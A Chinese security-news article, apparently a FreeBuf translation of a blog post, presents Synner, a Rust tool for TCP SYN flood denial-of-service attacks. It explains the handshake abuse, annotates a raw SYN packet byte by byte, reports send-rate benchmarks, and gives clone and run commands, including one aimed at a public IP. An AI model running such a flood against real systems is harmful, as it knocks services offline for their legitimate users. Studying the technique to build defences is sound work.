![1.png](https://image.3001.net/images/20180716/15317237992097.png!small)

## 摘要

**拒绝服务攻击（DDoS）从1970年出现直到今天都依然在作祟，并给全球范围内的各大组织带来了不可估量的损失。在这篇文章中，我们将跟大家介绍一种特定的DoS攻击，即TCP
SYN Flood攻击，并介绍一款名叫Synner的工具。**

该工具采用Rust开发，由libpnet驱动，该工具目前仍处于开发状态（WIP），不过现在的功能已经足以发布出来跟社区人员共享了。

## 介绍

Synner能够向目标快速持续地发送SYN数据包奥，并引起目标拒绝服务。一般来说，编写并将这类攻击工具开源出来，使很多安全社区的研究人员所诟病的，但我个人并不这样认为，因为我们只有清楚地知道攻击的具体实现方式，我们才能更好地保护自己。

### TCP SYNFlood攻击原理

TCP SYNFlood攻击利用的是TCP的三次握手（SYN -> SYN/ACK -> ACK），过程如下图所示：

![2.png](https://image.3001.net/images/20180716/15317238156962.png!small)

核心思想就是同步发送SYN数据包，这样的操作对于发送方（攻击者）来说是非常容易实现的，而对于接收方（目标）来说会需要消耗更多的资源去接收和处理数据包。除此之外，在发送完SYN数据包之后，我们不需要等待接收端返回的SYN/ACK数据包，我们只需要继续向对方发送SYN数据包并让服务器自己去处理就可以了。这样一来，当合法用户尝试连接服务器时，服务器已经有大量SYN连接需要去处理，因此将无法及时相应合法用户的请求。

![3.png](https://image.3001.net/images/20180716/15317238223345.png!small)

对于接收方来说还有一个难题，就是请求源是可以伪造的，尤其是src端口，这就增加了屏蔽非法请求的难度。

下面给出的是一个随机TCP SYN数据包的十六进制形式：

    
    
    0000   08 00 27 cb 9d 0b 48 4d 7e 9c 79 4b 08 00 4500   ..'Ë..HM~.yK..E.
    
    0010   00 34 7e b2 40 00 80 06 b8 b5 c0 a8 21 01 c0a8   .4~²@...¸µÀ¨!.À¨
    
    0020   21 0a f8 e0 b5 58 f4 fa f1 e9 00 00 00 00 8002   !.øàµXôúñé......
    
    0030   fa f0 66 5b 00 00 03 03 08 04 02 02 04 05 b401   úðf[..........´.
    
    0040   01 00      

解析出来之后的结果如下：

    
    
    0x08,0x00, 0x27, 0xcb, 0x9d, 0x0b,     //Destination MAC
    
    0x48,0x4d, 0x7e, 0x9c, 0x79, 0x4b,      //Source MAC
    
    0x08,0x00,                                                //Type (IPv4)
    
    0x45,                                                          //IPv4 Header Length
    
    0x00,                                                          //Explicit Congestion Notification (congestion control)
    
    0x00,0x34,                                                //Total length
    
    0x7e,0xb2,                                                //Identification number
    
    0x40,0x00,                                                //Fragment Offset (Don't Fragment packet for us, it's under 1460 bytes)
    
    0x80,                                                          //Time to Live (128)
    
    0x06,                                                        //IP protocol version (6/TCP)
    
    0xb8,0xb5,                                               //Header checksum using internet checksum technique (validation disabled)
    
    0xc0,0xa8, 0x21, 0x01,                          //Source IP
    
    0xc0,0xa8, 0x21, 0x0a,                          //Destination IP
    
    0xf8,0xe0,                                                 //TCP Source Port (max 65535)
    
    0xb5,0x58,                                                //TCP Destination Port (max 65535)
    
    0xf4,0xfa, 0xf1, 0xe9,                            //Sequence number, generally random to avoid other variants of TCP    attacks
    
    0x00,0x00, 0x00, 0x00,                         //TCP ACK value set to 0 since this is just a SYN packet
    
    0x80,0x02,                                                //TCP flags (only SYN [00000010] bit is set)
    
    0xfa,0xf0,                                                  //TCP window size
    
    0x66,0x5b,                                                //TCP checksum
    
    0x00,0x00,                                     //TCP urgent pointer set to 0,    useful with stuff like FTP that use port 20 &21 for control & transfer
    
    0x03,0x03, 0x08, 0x04,                         //TCP Options
    
    0x02,0x02, 0x04, 0x05,    0xb4,            // TCP Options values
    
    0x01,0x01, 0x00                             //TCP NOP option (padding)

## Synner到底有多快？

Synner一开始的速度还是比较慢的，首先我当时还没有使用任何编译器来对其进行优化，其次我当时选择使用的是pnet_datalink::DataLinkSender::send_to而不是pnet_datalink::DataLinkSender::build_and_send，这也就意味着我选择克隆数据包的方式还不够完美。因此，Synner当时发送1000000个TCPSYN数据包需要花29.48秒，相当于每秒钟发送33921个数据包，简直是受不了。

不过经过优化之后的结果还是比较好的，数据如下：

![4.png](https://image.3001.net/images/20180716/15317238529257.png!small)

原始的Powershell输出如下：

    
    
    PS C:\Users\jdb\Projects\synner\target\release>Measure-Command {./synner 192.168.33.10"\Device\NPF_{927C716F-3AD0-42D6-89A1-0B121C6F5413}"}
    
     
    
     
    
    Days              : 0
    
    Hours             : 0
    
    Minutes           : 0
    
    Seconds           : 6
    
    Milliseconds      : 736
    
    Ticks             : 67369563
    
    TotalDays         : 7.797403125E-05
    
    TotalHours        : 0.00187137675
    
    TotalMinutes      : 0.112282605
    
    TotalSeconds      : 6.7369563
    
    TotalMilliseconds: 6736.9563
    
     
    
     
    
     
    
    PSC:\Users\jdb\Projects\synner\target\release> pushd ../debug
    
    PSC:\Users\jdb\Projects\synner\target\debug> Measure-Command {./synner192.168.33.10 "\Device\NPF_{927C716F-3AD0-42D6-89A1-0B121C6F5413}"}
    
     
    
     
    
    Days              : 0
    
    Hours             : 0
    
    Minutes           : 0
    
    Seconds           : 19
    
    Milliseconds      : 688
    
    Ticks             : 196886353
    
    TotalDays         : 0.00022787772337963
    
    TotalHours        : 0.00546906536111111
    
    TotalMinutes      : 0.328143921666667
    
    TotalSeconds      : 19.6886353
    
    TotalMilliseconds: 19688.6353

## 工具要求

> 1\. rustc/cargov1.27.0
>
> 2\. WinPcapfor
> [libpnet](https://github.com/libpnet/libpnet#windows)（Windows）

## 工具使用

首先使用下列命令克隆项目源码：

    
    
    git clone https://github.com/JuxhinDB/synner.git

然后运行下列命令：

    
    
    cargo run TARGET_IP INTERFACE_NAME

为了确保能够导出完整的网络接口列表，请确保使用管理员权限运行命令行工具。

如果你无法确定接口名称，你可以使用\DEVICE\来查看接口列表，例如：

    
    
    cargo run 192.168.33.10 \DEVICE\
    
       Compiling synner v0.1.0(file:///C:/Users/juxhindb/Projects/synner)
    
        Finished dev [unoptimized + debuginfo]target(s) in 1.63s
    
         Running `target\debug\synner.exe192.168.33.10 \DEVICE\`
    
    Listof Available Interfaces
    
     
    
    Interfacename: "\\Device\\NPF_{B1BBC7C0-C3CF-490B-A640-00ABDB86F989}"
    
    InterfaceMAC: 0a:00:27:00:00:12
    
    InterfaceIP: 192.168.99.1
    
     
    
    Interfacename: "\\Device\\NPF_{AD266AD1-7AE0-4360-8EE5-ED6283B43B9C}"
    
    InterfaceMAC: 2a:56:5a:4f:fc:e9
    
    InterfaceIP: 0.0.0.0
    
     
    
    Interfacename: "\\Device\\NPF_{2288F93F-E56C-4F71-8B8E-C385BE71421F}"
    
    InterfaceMAC: 1a:56:5a:4f:fc:e9
    
    InterfaceIP: 0.0.0.0

## 使用样例

运行下列命令对一个DigitalOcean测试用例进行测试：

    
    
    cargo run 206.189.96.237 \Device\NPF_{F94968E8-FBA0-410D-8CD3-F205AEAD4DC9}

在下面这个GIF中，底部是运行Synner的界面，右边是一个SSH连接，用来查看TCP连接信息（sudotcpdump "tcp[tcpflags] &
(tcp-syn) != 0" -i eth0 -n），当我成功对第一个目标进行TCP SYN
Flood攻击之后，左边显示的是我尝试对第二个目标进行攻击的画面。

![5.gif](https://image.3001.net/images/20180716/15317239443012.gif!small)

 ***参考来源：[digital-horror](https://blog.digital-horror.com/synner-a-tcp-syn-client-written-in-rust/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

